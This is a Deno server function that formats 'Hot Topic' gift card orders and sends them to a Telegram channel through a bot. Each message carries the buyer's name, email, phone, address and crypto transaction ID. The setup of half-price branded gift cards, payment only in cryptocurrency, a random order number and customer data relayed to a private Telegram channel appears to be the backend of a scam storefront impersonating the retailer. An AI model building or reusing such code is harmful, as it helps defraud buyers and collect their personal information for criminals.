
import { serve } from "https://deno.land/std@0.168.0/http/server.ts";

const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN") || "";
const TELEGRAM_CHANNEL_ID = Deno.env.get("TELEGRAM_CHANNEL_ID") || "";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers":
    "authorization, x-client-info, apikey, content-type",
};

interface NotificationData {
  firstName: string;
  lastName: string;
  email: string;
  phone: string;
  address?: string;
  city?: string;
  state?: string;
  zipCode?: string;
  giftCardValue: number;
  discountedAmount: number;
  deliveryMethod: string;
  cryptoCurrency: string;
  transactionId?: string;
}

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const { data } = await req.json();
    
    if (!data) {
      throw new Error("No notification data provided");
    }

    const notification = data as NotificationData;
    
    // Format the message for Telegram with emojis and formatting
    const message = formatTelegramMessage(notification);
    
    // Send the message to Telegram
    const response = await sendTelegramMessage(message);
    
    console.log("Telegram notification sent:", response);
    
    return new Response(
      JSON.stringify({ success: true, message: "Notification sent to Telegram" }),
      {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
        status: 200,
      }
    );
  } catch (error) {
    console.error("Error sending Telegram notification:", error);
    
    return new Response(
      JSON.stringify({ success: false, error: error.message }),
      {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
        status: 500,
      }
    );
  }
});

function formatTelegramMessage(data: NotificationData): string {
  const currentDate = new Date().toLocaleString();
  
  let formattedAddress = "";
  if (data.deliveryMethod === "physical" && data.address) {
    formattedAddress = `
🏠 *Shipping Address:*
• Address: ${data.address}
• City: ${data.city}
• State: ${data.state}
• ZIP: ${data.zipCode}`;
  }

  return `
🔥 *NEW HOT TOPIC GIFT CARD ORDER* 🔥

📆 *Date:* ${currentDate}
💳 *Gift Card Order #${Math.floor(Math.random() * 10000).toString().padStart(4, '0')}*

👤 *Customer Details:*
• Name: ${data.firstName} ${data.lastName}
• Email: ${data.email}
• Phone: ${data.phone}${formattedAddress}

🎁 *Order Details:*
• Gift Card Value: $${data.giftCardValue.toFixed(2)}
• Sale Price (50% off): $${data.discountedAmount.toFixed(2)}
• Delivery Method: ${data.deliveryMethod === "e-gift" ? "E-Gift Card 📧" : "Physical Gift Card 📬"}
• Payment Method: ${data.cryptoCurrency} 💰
${data.transactionId ? `• Transaction ID: ${data.transactionId}` : ""}

⚡ *Hot Topic - Shop the edge of awesome!* ⚡
`;
}

async function sendTelegramMessage(message: string): Promise<any> {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHANNEL_ID) {
    throw new Error("Telegram credentials not configured");
  }
  
  const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  
  const response = await fetch(telegramApiUrl, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHANNEL_ID,
      text: message,
      parse_mode: "Markdown",
    }),
  });
  
  if (!response.ok) {
    const errorData = await response.json();
    throw new Error(`Telegram API error: ${JSON.stringify(errorData)}`);
  }
  
  return await response.json();
}
